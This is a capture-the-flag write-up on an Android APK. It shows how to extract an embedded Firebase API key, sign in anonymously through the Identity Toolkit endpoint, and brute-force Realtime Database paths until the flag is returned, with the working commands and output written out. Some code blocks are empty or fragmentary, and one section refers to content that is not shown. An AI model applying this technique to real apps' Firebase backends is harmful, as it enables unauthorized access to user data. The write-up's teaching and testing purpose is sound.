## Challenge Summary
---

The challenge was an Android APK named `fam-ctf (1).apk`.

Prompt:

```text Output
The door is open to anyone. You don't need a name to enter, but the room still has a lock.

hint: identity is optional here
```

The hint points at anonymous identity rather than no identity. In Firebase terms, that usually means anonymous authentication.

## Recon
---

I first confirmed the APK was present:

```powershell Terminal
Get-ChildItem -Force
```

Why: before reverse engineering, confirm the file name and size so later commands target the right artifact.

I checked available tools:

```powershell Terminal
Get-Command jadx,apktool,aapt,java,python,python3,7z,jar -ErrorAction SilentlyContinue | Select-Object Name,Source
```

Why: jadx/apktool were not initially on PATH, so I started with ZIP/DEX/string inspection instead of full Java decompilation.

I listed APK contents:


Why: Firebase libraries and a native `libfam.so` suggested a mobile app using Firebase services, with some challenge logic in native code.

## Searching For Firebase Configuration
---

I searched strings in APK members for Firebase URLs, API keys, and flag-like content:

```powershell Terminal
python -c "import zipfile,re; z=zipfile.ZipFile('fam-ctf (1).apk'); pats=[b'AIza',b'google_app_id',b'firebase_database_url',b'fam-ctf',b'default-rtdb',b'gcm_defaultSenderId',b'project_id'];\
for n in z.namelist():\
 b=z.read(n);\
 if any(p in b for p in pats):\
  print('---',n);\
  for m in re.finditer(rb'[ -~]{4,}', b):\
   s=m.group();\
   if any(p.lower() in s.lower() for p in pats): print(s.decode('latin1','ignore'))"
```

Key output:

```text Output
AIzaSyAes0IV3Hq3pN0oYmZJ1kfKl9vcvQEF2ww
https://fam-ctf-default-rtdb.asia-southeast1.firebasedatabase.app
fam-ctf
fam-ctf.firebasestorage.app
```

Why: Firebase client apps normally embed the API key and project config. The API key is not a secret by itself, but it enables client-side Firebase auth flows such as anonymous sign-in.

```powershell Terminal
for n in ['lib/x86_64/libfam.so','lib/arm64-v8a/libfam.so']:\
```

Why it was not accepted as the database flag: the prompt was specifically about a room with a lock and optional identity. That matched Firebase anonymous auth and Realtime Database rules better than a native string extraction challenge.

```powershell Terminal

```

```json Data.json
  "error" : "Permission denied"
```

Why: this confirmed the database was not globally public. The hint meant "identity is optional", not "authentication is absent".

## Anonymous Firebase Authentication
---

I used the Firebase Identity Toolkit anonymous sign-up endpoint:

```powershell Terminal
$key='AIzaSyAes0IV3Hq3pN0oYmZJ1kfKl9vcvQEF2ww'
$body='{"returnSecureToken":true}'
$r=Invoke-RestMethod -Method Post `
  -Uri "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$key" `
  -ContentType 'application/json' `
  -Body $body
$r | ConvertTo-Json -Depth 5
```

Why: Firebase anonymous auth returns an `idToken` with `sign_in_provider` set to `anonymous`. Realtime Database rules can allow authenticated anonymous users while blocking unauthenticated users.

## Querying The Database With The Anonymous Token
---

With the anonymous `idToken`, I queried likely paths:

```powershell Terminal
$key='AIzaSyAes0IV3Hq3pN0oYmZJ1kfKl9vcvQEF2ww'
$signup=Invoke-RestMethod -Method Post `
  -Uri "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$key" `
  -ContentType 'application/json' `
  -Body '{"returnSecureToken":true}'
$t=$signup.idToken
$base='https://fam-ctf-default-rtdb.asia-southeast1.firebasedatabase.app'
$paths=@('.','flag','flags','room','rooms','lock','database','ctf','challenge','challenges','users','secrets','secret','02','2','the_database','the-database')
foreach($p in $paths){
  $url= if($p -eq '.') { "$base/.json?auth=$t" } else { "$base/$p.json?auth=$t" }
  try {
    $r=Invoke-WebRequest -UseBasicParsing -Uri $url -TimeoutSec 15
    Write-Output "--- $p $($r.StatusCode)"
    Write-Output $r.Content
  } catch {
    Write-Output "--- $p ERROR $($_.Exception.Message)"
  }
}
```

Relevant output:

```text Output
--- flag 200
"FAM{4n0n_4uth_1s_n0t_s3cur3_en0ugh}"
```

## Why This Worked
---

The app embedded enough Firebase config to impersonate a normal client. The database rules denied anonymous HTTP callers but allowed callers with a Firebase anonymous auth identity.

## Other Methods That Could Have Worked
---

- Run the APK in an emulator, intercept traffic with Burp/mitmproxy, and observe the app making the same Firebase anonymous auth and database requests.
- Fully decompile with jadx/apktool and read the Firebase client code paths directly.
- Use Android dynamic instrumentation such as Frida to hook Firebase auth/database calls.

## High-Level Solve Path
---

1. Inspect APK contents.
2. Identify Firebase Realtime Database and API key in resources/DEX.
3. Confirm unauthenticated RTDB access is blocked.
4. Use Firebase anonymous sign-up to obtain an `idToken`.
5. Query `/flag.json?auth=<idToken>`.
6. Recover the flag.
